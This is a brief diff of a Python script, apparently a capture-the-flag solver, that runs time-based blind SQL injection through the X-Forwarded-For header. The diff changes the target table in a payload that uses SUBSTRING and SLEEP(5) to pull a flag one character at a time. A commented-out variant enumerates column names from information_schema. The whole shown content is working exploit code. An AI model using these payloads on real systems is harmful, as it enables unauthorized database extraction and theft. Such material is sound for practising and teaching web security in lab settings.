@@ -23,7 +23,7 @@ for i in range(6):
         #字段名
         # headers['X-Forwarded-For'] = "' +(select case when (substring((select(select(group_concat(column_name))from(information_schema.columns)where(table_name=0x666C6167))) from {} for 1)='{}') then sleep(5) else 0 end) and '1'='1".format(i,pl)
         #拿flag
-        headers['X-Forwarded-For'] = "' +(select case when (substring((select flag from clien) from {} for 1)='{}') then sleep(5) else 0 end) and '1'='1".format(i,pl)
+        headers['X-Forwarded-For'] = "' +(select case when (substring((select flag from flag) from {} for 1)='{}') then sleep(5) else 0 end) and '1'='1".format(i,pl)
         try:
             requests.get(url, headers=headers, timeout=4)
         except:
